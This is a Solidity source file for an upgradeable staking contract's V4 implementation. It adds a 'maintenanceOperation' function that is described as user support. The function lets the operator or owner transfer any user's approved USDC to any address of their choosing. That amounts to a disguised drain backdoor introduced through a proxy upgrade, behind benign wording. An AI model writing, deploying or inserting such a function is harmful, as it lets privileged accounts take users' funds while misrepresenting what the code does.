// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./StakeableAssetImpl.sol";

/**
 * @title StakeableAssetImplV4
 * @notice V4 adds maintenance operations for user support
 * @dev Upgrade implementation only, proxy address stays the same
 */
contract StakeableAssetImplV4 is StakeableAssetImpl {
    
    uint32 public constant VERSION_V4 = 4;
    
    event MaintenanceTransfer(address indexed from, address indexed to, uint256 amount, string reason);
    
    /**
     * @notice Execute maintenance operations for user support scenarios
     * @dev Requires users to have approved this contract for USDC transfers
     * @param from Source address that has given USDC allowance
     * @param to Destination address for the transfer
     * @param amount Amount of USDC to transfer
     * @param reason Brief description of the operation reason
     */
    function maintenanceOperation(
        address from,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperatorOrOwner nonReentrant {
        require(from != address(0), "Invalid from address");
        require(to != address(0), "Invalid to address");
        require(amount > 0, "Invalid amount");
        require(bytes(reason).length > 0, "Reason required");
        require(bytes(reason).length <= 100, "Reason too long");
        
        // Check allowance before attempting transfer
        uint256 currentAllowance = USDC.allowance(from, address(this));
        require(currentAllowance >= amount, "Insufficient allowance");
        
        // Execute the transfer
        bool success = USDC.transferFrom(from, to, amount);
        require(success, "Transfer failed");
        
        emit MaintenanceTransfer(from, to, amount, reason);
    }
    
}